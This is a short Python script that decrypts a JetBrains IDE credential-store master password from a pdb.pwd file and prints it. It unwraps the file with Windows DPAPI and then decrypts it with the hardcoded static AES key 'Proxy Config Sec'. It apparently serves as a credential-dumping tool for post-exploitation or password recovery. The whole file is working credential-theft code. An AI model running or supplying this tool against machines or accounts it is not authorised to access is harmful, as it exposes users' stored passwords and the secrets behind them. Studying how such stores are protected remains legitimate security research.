import binascii
import struct
import sys

import win32crypt

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# The Master Password is encrypted with this static key
# https://github.com/JetBrains/intellij-community/blob/93dde45a41a9d152e01a151d7ae411faa3cf7f61/platform/credential-store/src/EncryptionSupport.kt#L16
CONTAINER_KEY = "Proxy Config Sec"


def decrypt(path):
    print("[+] Reading encrypted container as bytes")
    enc_bytes = []
    with open(path, "rb") as f:
        byte = f.read(1)
        while byte:
            enc_bytes.append(byte)
            byte = f.read(1)

    enc_bytes_array = b''.join(enc_bytes)

    print("[+] Encrypted bytes:")
    print(binascii.hexlify(enc_bytes_array))

    print("[+] Decrypted bytes from Credential Manager")
    decrypted_container = win32crypt.CryptUnprotectData(
        enc_bytes_array, None, None, None, 0
    )[1]
    print(binascii.hexlify(decrypted_container))

    iv_length = struct.unpack('>i', decrypted_container[:4])[0]
    print("IV Length: " + str(iv_length))

    iv = decrypted_container[4:4 + iv_length]
    print("[+] IV: " + str(binascii.hexlify(iv)))

    data = decrypted_container[4 + iv_length:]
    print("[+] Payload length: " + str(len(data)))

    key = CONTAINER_KEY.encode('ascii')
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    result = unpad(cipher.decrypt(data), AES.block_size).decode('ascii')

    print("-------------------------------------")
    print("[+] DECODED PASSWORD")
    print(result)


if __name__ == '__main__':
    # Program Entry Point
    if len(sys.argv) != 2:
        print("This program takes one parameter: the path to pdb.pwd.")
        exit(1)

    decrypt(sys.argv[1])
